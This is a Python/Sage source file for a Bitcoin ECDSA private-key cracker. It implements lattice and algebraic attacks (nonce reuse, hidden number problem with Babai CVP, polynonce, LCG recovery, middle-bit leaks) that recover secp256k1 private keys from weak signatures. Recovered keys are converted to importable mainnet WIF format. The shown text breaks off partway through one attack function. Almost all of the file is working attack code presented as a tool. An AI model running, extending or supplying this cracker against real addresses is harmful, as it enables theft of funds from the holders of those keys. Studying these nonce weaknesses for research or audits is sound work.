"""
ADVANCED LATTICE CRACKER v5.0 — OPTIMIZED FOR 8GB RAM + ALL CORES
=================================================================
18 attacks. Fast. Memory-safe. Multiprocessing. No BKZ block > 20.

ATTACK ROSTER:
  PHASE 0 (Instant — No Lattice):
    0. Nonce Reuse Detection (k reused → trivial recovery) [NEW v5.0]
    1. GCD Small-Delta Detection
    2. LCG Phantom Recovery (quadratic equation)

  PHASE 0.5 (Novel Instant — No Lattice):
    3. Z-Correlation Nonce Detection [hash-derived k]
    4. Extended Polynonce: k=a*r+b (R-Linear)
    5. Quadratic Polynonce: k=a*z²+b*z+c
    6. Generalized Linear Recurrence [LFSR order 2-4]

  PHASE 1 (Fast — Tiny Lattice + LLL + Babai CVP):
    7. Babai HNP MSB
    8. Babai HNP LSB
    9. Stochastic Lattice Annealing (SLA) [NOVEL]
    10. Signature Filtering + Tiny Lattice
    11. Dario Clavijo Polynonce (Differential)
    12. Algebraic Polynonce (k=a*z+b, direct solve)
    13. Minerva Variable-Bitlength HNP [per-sig scaling]

  PHASE 2 (Standard HNP — Medium Lattice):
    14. Middle-Bit Window Leak
    15. Linear Nonce Bias (absorbs Sequential Nonce)
    16. Shared LSB (Fixed Suffix)

  PHASE 3 (Deep Reduction):
    17. Kannan Embedding (CVP→SVP)
    18. Progressive BKZ MSB/LSB (10→15→20)

CHANGES v4.2 → v5.0:
  + Attack 0: Nonce Reuse — O(n²) instant check for repeated k values
  + Fixed Attack 15 (Linear Recurrence): proper algebraic elimination for order-2
  + CLI: --file, --csv, --dir, --demo modes for flexible input
  + Timeout enforcement: elapsed-time guards in all long-running loops
  + Per-attack timing statistics printed at end of run
  + --verbose / --quiet modes
  + Better multiprocessing: graceful Pool shutdown on early success
  + Phase flush correctness: all phases properly flush before advancing
  + Demo mode: generates synthetic vulnerable sigs for self-test

REMOVED (v4.2):
  - Monte Carlo: strictly dominated by SLA (guided search)
  - Sequential Nonce: identical math to Linear Bias (merged configs)
  - Greedy Round-Off: weaker CVP than Babai + duplicate LLL extraction
  - Multi-Leak Fusion: requires leak_type metadata not present in real data
"""

import json
import os
import csv
import math
import argparse
import time
import random as py_random
import shutil
import logging
import hashlib
from multiprocessing import Pool, cpu_count
from sage.all import *

# ==============================================================================
# LOGGING
# ==============================================================================
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
_LOG_FILE = os.path.join(_SCRIPT_DIR, "ADVANCED_ERRORS.log")
logging.basicConfig(
    filename=_LOG_FILE,
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("AdvancedCracker")

# ==============================================================================
# SECP256K1 CONSTANTS
# ==============================================================================
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

Fp = GF(p)
E = EllipticCurve(Fp, [0, 7])
G = E(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

MAX_SIGS = 100         # Upper limit to allow Babai LLL its required 90+ geometric space
ATTACK_TIMEOUT = 120   # Max seconds per individual attack
N_HALF = N >> 1        # N // 2 for low-s normalization

# Runtime flags (set by argparse in main)
SKIP_GCD = False
VERBOSE = False
QUIET = False

# Global statistics collector
_attack_stats = []  # List of (attack_name, elapsed, success_bool)

# ==============================================================================
# CORE UTILITIES
# ==============================================================================
def normalize_s(sigs):
    """Enforce Bitcoin's low-s rule: if s > N/2, replace with N - s.
    Returns a new list — does not mutate the original."""
    out = []
    for sig in sigs:
        sig = dict(sig)  # shallow copy
        s_val = int(sig['s'], 16)
        if s_val > N_HALF:
            sig['s'] = hex(N - s_val)
        out.append(sig)
    return out


def validate_sigs(sigs):
    """Filter out signatures with missing or invalid r/s/z hex fields."""
    valid = []
    for sig in sigs:
        try:
            int(sig['r'], 16)
            int(sig['s'], 16)
            int(sig['z'], 16)
            valid.append(sig)
        except (KeyError, ValueError, TypeError):
            continue
    return valid


def verify_key(pub_hex, priv_int):
    priv_int = int(priv_int)
    if priv_int <= 0 or priv_int >= N:
        return False
    try:
        pt = priv_int * G
        x_bytes = int(pt[0]).to_bytes(32, 'big')
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            y_bytes = int(pt[1]).to_bytes(32, 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            prefix = b'\x02' if int(pt[1]) % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
        return generated_pub == pub_hex.lower()
    except Exception:
        return False


def min_sigs_lll(leaked_bits):
    """Geometry bounds for LLL-based Babai attacks. Capped at 50 to avoid OOM."""
    if leaked_bits >= 32: return 12
    if leaked_bits >= 16: return 24
    if leaked_bits >= 12: return 40
    if leaked_bits >= 8: return 50
    return 200  # Below 8-bit leak: Babai is ineffective, skip

def min_sigs_bkz(leaked_bits):
    """Tight, strict bounds solely for BKZ block reduction to preserve speed."""
    if leaked_bits >= 32: return 12
    if leaked_bits >= 16: return 24
    if leaked_bits >= 12: return 32
    if leaked_bits >= 8: return 45
    if leaked_bits >= 6: return 59
    if leaked_bits >= 4: return 75
    return 80


def privkey_to_wif(priv_int, compressed=True):
    """Convert a private key integer to WIF format (mainnet)."""
    priv_int = int(priv_int)
    raw = b'\x80' + priv_int.to_bytes(32, 'big')
    if compressed:
        raw += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
    payload = raw + checksum
    B58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    n = int.from_bytes(payload, 'big')
    chars = []
    while n > 0:
        n, r = divmod(n, 58)
        chars.append(B58_CHARS[r])
    for b in payload:
        if b == 0:
            chars.append('1')
        else:
            break
    return ''.join(reversed(chars))


def precompute_uv(sigs):
    """Precompute (u, v) = (r*s_inv, z*s_inv) for each sig.
    Uses analyzer's pre-computed A/B if available."""
    uv = []
    for s in sigs:
        if 'A' in s and 'B' in s:
            uv.append((int(s['A'], 16), int(s['B'], 16)))
        else:
            r = int(s['r'], 16)
            si = int(s['s'], 16)
            z = int(s['z'], 16)
            si_inv = int(inverse_mod(si, N))
            uv.append(((r * si_inv) % N, (z * si_inv) % N))
    return uv


def precompute_sig_data(sigs):
    """Precompute (r, s, z, s_inv, t=r*s_inv, a=z*s_inv) once for all attacks.
    Avoids redundant inverse_mod calls across 18 attacks."""
    data = []
    for sig in sigs:
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        z = int(sig['z'], 16)
        s_inv = int(inverse_mod(s, N))
        t = (r * s_inv) % N
        a = (z * s_inv) % N
        data.append({'r': r, 's': s, 'z': z, 's_inv': s_inv, 't': t, 'a': a})
    return data


_pub_point_cache = {}
def verify_key_fast(pub_hex, priv_int):
    """Cached-pubpoint verify_key — avoids re-parsing pub each call."""
    priv_int = int(priv_int)
    if priv_int <= 0 or priv_int >= N:
        return False
    try:
        if pub_hex not in _pub_point_cache:
            if pub_hex.startswith('04') and len(pub_hex) == 130:
                xp = int(pub_hex[2:66], 16)
                yp = int(pub_hex[66:], 16)
                _pub_point_cache[pub_hex] = E(Fp(xp), Fp(yp))
            else:
                xp = int(pub_hex[2:], 16)
                y_even = pub_hex[:2] == '02'
                ys = E.lift_x(Fp(xp))
                if (int(ys[1]) % 2 == 0) != y_even:
                    ys = E(Fp(xp), Fp(-int(ys[1])))
                _pub_point_cache[pub_hex] = ys
        pt = priv_int * G
        return pt == _pub_point_cache[pub_hex]
    except Exception:
        return False


def exact_div(n, d):
    """Infinitely precise Python integer division truncating towards zero."""
    n, d = int(n), int(d)
    return n // d if n * d >= 0 else -(abs(n) // abs(d))

def extract_key(M_r, key_col, scale, pub):
    for row in M_r:
        val = int(row[key_col])
        if val == 0:
            continue
        for sign in [1, -1]:
            cand = (sign * (val // scale)) % N
            if cand != 0 and verify_key_fast(pub, cand):
                return cand
        try:
            scale_inv = int(inverse_mod(int(scale) % N, N))
            for sign in [1, -1]:
                cand = (sign * val * scale_inv) % N
                if cand != 0 and verify_key_fast(pub, cand):
                    return cand
        except Exception:
            pass
    return None


def extract_key_extended(M_r, key_col, scale, pub, search_range=5):
    for row in M_r:
        val = int(row[key_col])
        if val == 0:
            continue
        base = val // scale
        for offset in range(-search_range, search_range + 1):
            for sign in [1, -1]:
                cand = (sign * (base + offset)) % N
                if cand != 0 and verify_key_fast(pub, cand):
                    return cand
        try:
            scale_inv = int(inverse_mod(int(scale) % N, N))
            mod_base = (val * scale_inv) % N
            for offset in range(-search_range, search_range + 1):
                for sign in [1, -1]:
                    cand = (sign * (mod_base + offset)) % N
                    if cand != 0 and verify_key_fast(pub, cand):
                        return cand
        except Exception:
            pass
    return None


class AttackTimeout(Exception):
    """Raised when an individual attack exceeds ATTACK_TIMEOUT seconds."""
    pass


def check_deadline(t0, budget=ATTACK_TIMEOUT):
    """Check if elapsed time exceeds budget; raise AttackTimeout if so."""
    if time.time() - t0 > budget:
        raise AttackTimeout(f"Exceeded {budget}s budget")


# ==============================================================================
# LATTICE BUILDERS
# ==============================================================================
def build_msb_lattice(sigs, leaked_bits):
    """Standard HNP lattice for MSB leak.
    Correctly scales t_i, a_i columns by W to embed the HNP optimally."""
    num = min(len(sigs), MAX_SIGS)
    sigs = sigs[:num]
    W = 2 ** leaked_bits
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    mu = N // (2 * W)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (r_i * s_inv) % N
        a_i = (z_i * s_inv) % N
        M[i, i] = N * W
        M[num, i] = t_i * W
        M[num + 1, i] = (a_i - mu) * W
    M[num, num] = 1
    M[num + 1, num + 1] = N
    return M, 1, num


def build_lsb_lattice(sigs, leaked_bits):
    """Standard HNP lattice for LSB leak.
    Shifts out known low bits, then same structure as MSB."""
    num = min(len(sigs), MAX_SIGS)
    sigs = sigs[:num]
    shift = 2 ** leaked_bits
    W = 2 ** leaked_bits
    shift_inv = int(inverse_mod(shift, N))
    dim = num + 2
    M = Matrix(ZZ, dim, dim)
    mu = N // (2 * W)
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        t_i = (shift_inv * r_i * s_inv) % N
        a_i = (shift_inv * z_i * s_inv) % N
        M[i, i] = N * W
        M[num, i] = t_i * W
        M[num + 1, i] = (a_i - mu) * W
    M[num, num] = 1
    M[num + 1, num + 1] = N
    return M, 1, num


# ==============================================================================
# REDUCTION METHODS
# ==============================================================================
def progressive_reduce(M, max_block=20):
    """Progressive BKZ: LLL → BKZ-10 → BKZ-15 → BKZ-20. Capped at 20 for speed."""
    M_r = M.LLL()
    nrows = M.nrows()
    for bs in sorted(set([10, 15, min(max_block, nrows)])):
        if bs > nrows or bs < 2:
            continue
        try:
            M_r = M_r.BKZ(block_size=bs)
        except Exception:
            break
    return M_r


# ==============================================================================
# BABAI'S NEAREST PLANE (CVP SOLVER)
# ==============================================================================
def babai_cvp(lattice_basis, target_vector):
    """Babai's Nearest Plane CVP using RealField(512).
    512-bit precision is 2x curve size — sufficient while being 4x faster than 1024."""
    RF = RealField(512)
    B = Matrix(RF, lattice_basis)
    n = B.nrows()

    # Manual Gram-Schmidt orthogonalization
    G = []
    G_norms = []
    for i in range(n):
        g_i = B[i]
        for j in range(i):
            denom = G_norms[j]
            if denom > RF(1e-100):
                mu_ij = B[i].dot_product(G[j]) / denom
                g_i = g_i - mu_ij * G[j]
        G.append(g_i)
        G_norms.append(g_i.dot_product(g_i))

    b = vector(RF, target_vector)
    for i in range(n - 1, -1, -1):
        denom = G_norms[i]
        if denom < RF(1e-100):
            continue
        ci = round(b.dot_product(G[i]) / denom)
        b -= RF(ci) * B[i]
    closest = vector(ZZ, target_vector) - vector(ZZ, [ZZ(round(x)) for x in b])
    return closest


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 0: NONCE REUSE DETECTION [NEW v5.0]
# ██████████████████████████████████████████████████████████████████████████████
def solve_nonce_reuse(pub, sigs):
    """Detect if any two signatures share the same nonce k (same r value).
    If k_i == k_j, then d = (z_i*s_j - z_j*s_i) / (r*(s_i - s_j)) mod N.
    This is the most basic ECDSA vulnerability — O(n²) instant check."""
    n = len(sigs)
    if n < 2:
        return None
    t0 = time.time()

    # Group by r-value (same r → same k or k and N-k)
    r_groups = {}
    for idx, sig in enumerate(sigs):
        r_val = sig['r'].lower().lstrip('0') or '0'
        if r_val not in r_groups:
            r_groups[r_val] = []
        r_groups[r_val].append(idx)

    for r_val, indices in r_groups.items():
        if len(indices) < 2:
            continue
        # Found signatures with same r — attempt recovery
        r = int(sigs[indices[0]]['r'], 16)
        if r == 0:
            continue

        for i in range(len(indices)):
            for j in range(i + 1, len(indices)):
                if time.time() - t0 > 10:
                    return None
                idx_i, idx_j = indices[i], indices[j]
                s_i = int(sigs[idx_i]['s'], 16)
                s_j = int(sigs[idx_j]['s'], 16)
                z_i = int(sigs[idx_i]['z'], 16)
                z_j = int(sigs[idx_j]['z'], 16)

                # Case 1: k_i == k_j (same nonce)
                ds = (s_i - s_j) % N
                if ds != 0:
                    try:
                        ds_inv = int(inverse_mod(int(ds), N))
                        # k = (z_i - z_j) * inv(s_i - s_j) mod N
                        k_cand = ((z_i - z_j) * ds_inv) % N
                        if k_cand != 0:
                            # d = (s_i * k - z_i) * inv(r) mod N
                            r_inv = int(inverse_mod(int(r), N))
                            d_cand = ((s_i * k_cand - z_i) * r_inv) % N
                            if d_cand != 0 and verify_key_fast(pub, d_cand):
                                return d_cand
                    except Exception:
                        pass

                # Case 2: k_i == -k_j mod N (negated nonce, same |r|)
                ds2 = (s_i + s_j) % N
                if ds2 != 0:
                    try:
                        ds2_inv = int(inverse_mod(int(ds2), N))
                        k_cand = ((z_i + z_j) * ds2_inv) % N
                        if k_cand != 0:
                            r_inv = int(inverse_mod(int(r), N))
                            d_cand = ((s_i * k_cand - z_i) * r_inv) % N
                            if d_cand != 0 and verify_key_fast(pub, d_cand):
                                return d_cand
                    except Exception:
                        pass
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 1: GCD SMALL-DELTA NONCE DETECTION
# ██████████████████████████████████████████████████████████████████████████████
def solve_gcd_nonce(pub, sigs, max_delta=100, precomputed_uv=None):
    n = len(sigs)
    if n < 2:
        return None
    t0 = time.time()
    uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)
    for i in range(min(n, 30)):
        for j in range(i + 1, min(i + 5, n)):
            if time.time() - t0 > ATTACK_TIMEOUT:
                return None
            du = (uv[j][0] - uv[i][0]) % N
            dv = (uv[j][1] - uv[i][1]) % N
            if du == 0:
                continue
            du_inv = int(inverse_mod(int(du), N))
            for delta in range(-max_delta, max_delta + 1):
                d_cand = int(((delta - dv) * du_inv) % N)
                if d_cand == 0 or d_cand >= N:
                    continue
                consistent_count = 0
                check_count = 0
                for m in range(min(n, 15)):
                    if m == i or m == j:
                        continue
                    diff_m = (d_cand * (uv[m][0] - uv[i][0]) + (uv[m][1] - uv[i][1])) % N
                    if diff_m > N_HALF:
                        diff_m = N - diff_m
                    check_count += 1
                    if diff_m < max_delta * 10:
                        consistent_count += 1
                    if check_count >= 4:
                        break
                if consistent_count < 2:
                    continue
                if verify_key_fast(pub, d_cand):
                    return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 2: LCG PHANTOM RECOVERY [NOVEL]
# ██████████████████████████████████████████████████████████████████████████████
def solve_lcg_phantom(pub, sigs, precomputed_uv=None):
    n = len(sigs)
    if n < 4:
        return None
    t0 = time.time()
    uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)
    for start in range(min(n - 3, 50)):
        if time.time() - t0 > ATTACK_TIMEOUT:
            return None
        u0, v0 = uv[start]
        u1, v1 = uv[start + 1]
        u2, v2 = uv[start + 2]
        u3, v3 = uv[start + 3]
        a0 = (u1 - u0) % N; b0 = (v1 - v0) % N
        a1 = (u2 - u1) % N; b1 = (v2 - v1) % N
        a2 = (u3 - u2) % N; b2 = (v3 - v2) % N
        A_c = (a1 * a1 - a0 * a2) % N
        B_c = (2 * a1 * b1 - a0 * b2 - a2 * b0) % N
        C_c = (b1 * b1 - b0 * b2) % N
        if A_c == 0:
            if B_c == 0:
                continue
            try:
                d_cand = int((-C_c * inverse_mod(int(B_c), N)) % N)
            except Exception:
                continue
            if d_cand != 0 and verify_key_fast(pub, d_cand):
                return d_cand
            continue
        disc = (B_c * B_c - 4 * A_c * C_c) % N
        try:
            sqrt_disc = int(Mod(disc, N).sqrt())
        except Exception:
            continue
        two_A = (2 * A_c) % N
        if two_A == 0:
            continue
        try:
            inv_2A = int(inverse_mod(int(two_A), N))
        except Exception:
            continue
        for sign in [1, -1]:
            d_cand = int(((-B_c + sign * sqrt_disc) * inv_2A) % N)
            if d_cand != 0 and verify_key_fast(pub, d_cand):
                return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 3 & 4: BABAI HNP (MSB + LSB)
# ██████████████████████████████████████████████████████████████████████████████
def solve_babai_msb(pub, sigs, leaked_bits, sig_data=None):
    sigs = sigs[:MAX_SIGS]
    M, B_scale, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B_scale, pub)
    if d:
        return d
    d = extract_key_extended(M_r, key_col, B_scale, pub)
    if d:
        return d
    del M, M_r
    # Babai CVP (skip if num > 30 — Gram-Schmidt is O(n³))
    num = len(sigs)
    if num > 30:
        return None
    W = 2 ** leaked_bits
    dim = num + 1
    L = Matrix(ZZ, dim, dim)
    t_vals = []
    a_vals = []
    sd = sig_data[:num] if sig_data and len(sig_data) >= num else None
    for i in range(num):
        if sd:
            t_vals.append(sd[i]['t'])
            a_vals.append(sd[i]['a'])
        else:
            r_i = int(sigs[i]['r'], 16)
            s_i = int(sigs[i]['s'], 16)
            z_i = int(sigs[i]['z'], 16)
            s_inv = int(inverse_mod(s_i, N))
            t_vals.append((r_i * s_inv) % N)
            a_vals.append((z_i * s_inv) % N)
        L[i, i] = N
    for i in range(num):
        L[num, i] = t_vals[i]
    L[num, num] = W
    L_r = L.LLL()
    target = vector(ZZ, [(-a_vals[i]) % N for i in range(num)] + [0])
    closest = babai_cvp(L_r, target)
    d_cand = exact_div(closest[num], W) % N
    if d_cand != 0 and verify_key_fast(pub, d_cand):
        return d_cand
    d_cand = (-d_cand) % N
    if d_cand != 0 and verify_key_fast(pub, d_cand):
        return d_cand
    return None


def solve_babai_lsb(pub, sigs, leaked_bits, sig_data=None):
    sigs = sigs[:MAX_SIGS]
    M, B_scale, key_col = build_lsb_lattice(sigs, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B_scale, pub)
    if d:
        return d
    d = extract_key_extended(M_r, key_col, B_scale, pub)
    if d:
        return d
    del M, M_r
    # Babai CVP (skip if num > 30)
    num = len(sigs)
    if num > 30:
        return None
    W = 2 ** leaked_bits
    shift = 2 ** leaked_bits
    shift_inv = int(inverse_mod(shift, N))
    dim = num + 1
    L = Matrix(ZZ, dim, dim)
    t_vals = []
    a_vals = []
    sd = sig_data[:num] if sig_data and len(sig_data) >= num else None
    for i in range(num):
        if sd:
            t_vals.append((shift_inv * sd[i]['t']) % N)
            a_vals.append((shift_inv * sd[i]['a']) % N)
        else:
            r_i = int(sigs[i]['r'], 16)
            s_i = int(sigs[i]['s'], 16)
            z_i = int(sigs[i]['z'], 16)
            s_inv = int(inverse_mod(s_i, N))
            t_vals.append((shift_inv * r_i * s_inv) % N)
            a_vals.append((shift_inv * z_i * s_inv) % N)
        L[i, i] = N
    for i in range(num):
        L[num, i] = t_vals[i]
    L[num, num] = W
    L_r = L.LLL()
    target = vector(ZZ, [(-a_vals[i]) % N for i in range(num)] + [0])
    closest = babai_cvp(L_r, target)
    d_cand = exact_div(closest[num], W) % N
    if d_cand != 0 and verify_key_fast(pub, d_cand):
        return d_cand
    d_cand = (-d_cand) % N
    if d_cand != 0 and verify_key_fast(pub, d_cand):
        return d_cand
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 8a: ALGEBRAIC POLYNONCE (k = a*z + b, direct solve)
# ██████████████████████████████████████████████████████████████████████████████
def solve_polynonce_algebraic(pub, sigs):
    """Direct algebraic solve for linear polynonce: k_i = a*z_i + b (mod N).
    Uses 3 signatures to eliminate a and b, solving for d directly.
    Tries all consecutive triples and also spread-out triples."""
    n = len(sigs)
    if n < 3:
        return None
    t0 = time.time()
    parsed = []
    for s in sigs:
        parsed.append((int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)))

    def try_triple(i, j, k):
        r0, s0, z0 = parsed[i]
        r1, s1, z1 = parsed[j]
        r2, s2, z2 = parsed[k]
        A01 = ((s0 * z0) * r1 - (s1 * z1) * r0) % N
        B01 = (s0 * r1 - s1 * r0) % N
        C01 = (z0 * r1 - z1 * r0) % N
        A02 = ((s0 * z0) * r2 - (s2 * z2) * r0) % N
        B02 = (s0 * r2 - s2 * r0) % N
        C02 = (z0 * r2 - z2 * r0) % N
        det = (A01 * B02 - A02 * B01) % N
        if det == 0:
            return None
        try:
            det_inv = int(inverse_mod(int(det), N))
        except Exception:
            return None
        a_val = ((C01 * B02 - C02 * B01) * det_inv) % N
        if B01 == 0:
            if B02 == 0:
                return None
            b_val = ((C02 - a_val * A02) * int(inverse_mod(int(B02), N))) % N
        else:
            b_val = ((C01 - a_val * A01) * int(inverse_mod(int(B01), N))) % N
        try:
            r0_inv = int(inverse_mod(r0, N))
        except Exception:
            return None
        d_cand = (((a_val * s0) * z0 + b_val * s0 - z0) * r0_inv) % N
        if d_cand != 0 and verify_key_fast(pub, d_cand):
            return d_cand
        return None

    # Try consecutive triples
    for i in range(min(n - 2, 60)):
        if time.time() - t0 > ATTACK_TIMEOUT:
            return None
        d = try_triple(i, i + 1, i + 2)
        if d:
            return d
    # Try limited spread-out triples (max ~200 attempts vs original 24000)
    spread_attempts = 0
    for i in range(min(n, 10)):
        for j in range(i + 3, min(n, 20)):
            for k in range(j + 3, min(n, 30)):
                d = try_triple(i, j, k)
                if d:
                    return d
                spread_attempts += 1
                if spread_attempts >= 200:
                    return None
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 8b: DARIO CLAVIJO DIFFERENTIAL POLYNONCE (LATTICE)
# ██████████████████████████████████████████████████████████████████████████████
def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
    sigs = sigs[:MAX_SIGS]
    msgs = [int(s['z'], 16) for s in sigs]
    sig_pairs = [(int(s['r'], 16), int(s['s'], 16)) for s in sigs]
    m = len(msgs)
    msgn, rn, sn = msgs[-1], sig_pairs[-1][0], sig_pairs[-1][1]
    rnsn_inv = (rn * int(inverse_mod(sn, N))) % N
    mnsn_inv = (msgn * int(inverse_mod(sn, N))) % N
    matrix = Matrix(ZZ, m + 2, m + 2)
    for i in range(m):
        matrix[i, i] = N
    for i in range(m):
        si_inv = int(inverse_mod(sig_pairs[i][1], N))
        x0 = ((sig_pairs[i][0] * si_inv) - rnsn_inv) % N
        x1 = ((msgs[i] * si_inv) - mnsn_inv) % N
        matrix[m, i] = x0
        matrix[m + 1, i] = x1
    B_val = int(2**B_bits)
    matrix[m, m] = B_val
    matrix[m + 1, m + 1] = N
    if use_bkz:
        new_matrix = matrix.LLL()
        new_matrix = new_matrix.BKZ(block_size=min(20, m))
    else:
        new_matrix = matrix.LLL(delta=0.99, early_red=True, use_siegel=True)
    for row in new_matrix:
        val = row[m]
        if val == 0:
            continue
        possible_d = exact_div(val, B_val) % N
        if possible_d != 0 and verify_key_fast(pub, possible_d):
            return possible_d
        neg_d = (-possible_d) % N
        if neg_d != 0 and verify_key_fast(pub, neg_d):
            return neg_d
        # Differential extraction with proper modular arithmetic
        diff_val = row[0]
        if diff_val == 0:
            continue
        for sign_v in (1, -1):
            potential_nonce_diff = sign_v * int(diff_val)
            numerator = ((sn * msgs[0]) % N - (sig_pairs[0][1] * msgn) % N
                         - (sig_pairs[0][1] * sn % N * potential_nonce_diff) % N) % N
            denominator = ((rn * sig_pairs[0][1]) % N - (sig_pairs[0][0] * sn) % N) % N
            if denominator == 0:
                continue
            try:
                denom_inv = int(inverse_mod(int(denominator), N))
                key = (numerator * denom_inv) % N
                if key != 0 and verify_key_fast(pub, key):
                    return key
            except Exception:
                pass
    return None



# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 6: STOCHASTIC LATTICE ANNEALING (SLA) [NOVEL]
# ██████████████████████████████████████████████████████████████████████████████
def solve_sla(pub, sigs, leaked_bits, iterations=60, sample_size=15, time_budget=30):
    """SLA with time budget. Only builds MSB lattice per iteration to halve LLL calls.
    Tries LSB only on final best indices."""
    n = len(sigs)
    if n < sample_size:
        sample_size = n
    temperature = 1.0
    cooling = 0.97
    indices = py_random.sample(range(n), sample_size)
    best_score = float('inf')
    current_score = float('inf')
    best_indices = indices[:]
    t0 = time.time()

    for iteration in range(iterations):
        if time.time() - t0 > time_budget:
            break
        subset = [sigs[i] for i in indices]
        # Only MSB per iteration (LSB at the end on best)
        M_msb, B, key_col = build_msb_lattice(subset, leaked_bits)
        M_msb_r = M_msb.LLL()
        d1 = extract_key(M_msb_r, key_col, B, pub)
        if d1: return d1

        score = float('inf')
        for row in M_msb_r:
            if row[key_col] != 0:
                score = float(row.norm())
                break
        if score < best_score:
            best_score = score
            best_indices = indices[:]
        new_indices = indices[:]
        available = [i for i in range(n) if i not in new_indices]
        if not available:
            break
        num_swaps = min(py_random.randint(1, 2), len(available))
        for _ in range(num_swaps):
            if not available:
                break
            pos = py_random.randint(0, len(new_indices) - 1)
            new_idx = py_random.choice(available)
            old_idx = new_indices[pos]
            available.remove(new_idx)
            available.append(old_idx)
            new_indices[pos] = new_idx
        delta = score - current_score
        if delta <= 0 or py_random.random() < math.exp(-delta / (temperature + 1e-10)):
            indices = new_indices
            current_score = score
        temperature *= cooling

    # Final attempt on best — try both MSB and LSB
    subset = [sigs[i] for i in best_indices]
    M, B, key_col = build_msb_lattice(subset, leaked_bits)
    M_r = M.LLL()
    d = extract_key(M_r, key_col, B, pub)
    if d:
        return d
    del M, M_r
    M, B, key_col = build_lsb_lattice(subset, leaked_bits)
    M_r = M.LLL()
    return extract_key(M_r, key_col, B, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 7: SIGNATURE FILTERING + TINY LATTICE
# ██████████████████████████████████████████████████████████████████████████████
def solve_filtered_lattice(pub, sigs, leaked_bits):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 5:
        return None
    scored = []
    for idx, sig in enumerate(sigs):
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        s_inv = int(inverse_mod(s, N))
        t = (r * s_inv) % N
        score = 0
        r_bits = int(r).bit_length()
        if r_bits < 248:
            score += (256 - r_bits) * 3
        if r_bits < 240:
            score += 50
        r_hex = hex(r)[2:].zfill(64)
        leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
        score += leading_zeros * 10
        s_bits = int(s).bit_length()
        if s_bits < 240:
            score += (256 - s_bits) * 2
        if t < N // 256 or t > N - N // 256:
            score += 30
        scored.append((score, idx))
    scored.sort(reverse=True)
    for k in [10, 15, 20]:
        if k > num:
            break
        top_sigs = [sigs[scored[i][1]] for i in range(k)]
        M, B, key_col = build_msb_lattice(top_sigs, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d:
            return d
        M, B, key_col = build_lsb_lattice(top_sigs, leaked_bits)
        M_r = M.LLL()
        d = extract_key(M_r, key_col, B, pub)
        if d:
            return d
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 9: MIDDLE-BIT WINDOW LEAK
# ██████████████████████████████████████████████████████████████████████████████
def solve_middle_bits(pub, sigs, window_bits, start_bit, progressive=False):
    num = min(len(sigs), 30)  # 30 is enough and fast for w=16
    sigs = sigs[:num]
    dim = 2 * num + 1
    M = Matrix(ZZ, dim, dim)

    S_L = 2 ** max(0, 255 - start_bit - window_bits)
    S_H = 2 ** max(0, start_bit - 1)

    mu_L = 2 ** (start_bit - 1)
    mu_H = 2 ** (255 - start_bit - window_bits)
    shift_H = 2 ** (start_bit + window_bits)

    W_1 = S_L * (2 ** window_bits)

    T = []
    A = []
    for i in range(num):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        s_inv = int(inverse_mod(s_i, N))
        T.append((r_i * s_inv) % N)
        A.append((z_i * s_inv) % N)

    T0_inv = int(inverse_mod(T[0], N))
    U = [(T[i] * T0_inv) % N for i in range(num)]

    C = [(A[i] - mu_L - mu_H * shift_H) % N for i in range(num)]
    K = [(C[i] - U[i] * C[0]) % N for i in range(num)]

    # 1. N-reduction rows
    for i in range(num - 1):
        M[i, i] = N * S_L

    # 2. Row for \Delta L_0
    row_L0 = num - 1
    for i in range(num - 1):
        M[row_L0, i] = (U[i+1] * S_L) % (N * S_L)
    M[row_L0, num - 1] = 1 * S_L

    # 3. Rows for \Delta H_i
    for i in range(num - 1):
        row_Hi = num + i
        val = (-shift_H) % N
        M[row_Hi, i] = (val * S_L) % (N * S_L)
        M[row_Hi, num + i] = 1 * S_H

    # 4. Row for \Delta H_0
    row_H0 = 2 * num - 1
    for i in range(num - 1):
